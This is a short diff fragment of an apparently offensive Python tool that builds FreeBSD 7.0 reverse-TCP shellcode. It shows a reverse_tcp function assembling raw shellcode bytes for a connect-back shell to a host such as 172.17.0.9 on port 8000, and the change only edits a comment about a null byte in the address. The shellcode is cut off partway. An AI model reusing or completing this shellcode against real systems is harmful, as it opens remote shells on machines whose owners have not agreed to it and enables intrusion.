@@ -9,7 +9,7 @@
 #; FreeBSD 7.0-RELEASE
 
 def reverse_tcp(ip, port):
-	#push    0x90011ac      ; host 172.17.0.9 (.0. is a NULL)
+	#push    0x90011ac      ; host 172.17.0.9 
 	#push    0x401f02AA     ; port 8000
 	shellcode =  r"\x31\xc0\x50\x50\xb0\x17\x50\xcd\x80\x50"
 	shellcode += r"\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89"
